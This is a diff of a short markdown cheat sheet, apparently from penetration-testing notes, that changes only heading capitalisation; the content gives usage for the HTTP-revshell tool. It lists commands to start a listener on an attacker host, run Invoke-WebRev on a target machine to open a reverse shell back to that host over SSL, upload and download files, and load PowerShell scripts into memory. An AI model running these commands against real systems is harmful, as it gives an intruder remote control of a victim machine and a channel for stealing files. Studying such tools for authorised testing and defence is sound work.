@@ -1,27 +1,27 @@
-### source
+### Source
 https://github.com/3v4Si0N/HTTP-revshell  
 
-### start listener
+### Start listener
 ```
 $> python3 server.py <lhost> <lport> --ssl
 ```
 
-### start on target machine
+### Start on target machine
 ```
 PS> Invoke-WebRev -ip <lhost> -port <lport> -ssl
 ```
 
-### upload/download files
+### Upload/download files
 ```
 PS> upload <source/path> <C:\destination\path>
 ```
 
-### load powershellscript into memory
+### Load powershellscript into memory
 ```
 PS> loadps1 <source/path>
 ```
 
-### for server: you might need to install
+### For server: you might need to install
 ```
 sudo apt install libncurses5-dev
 ```
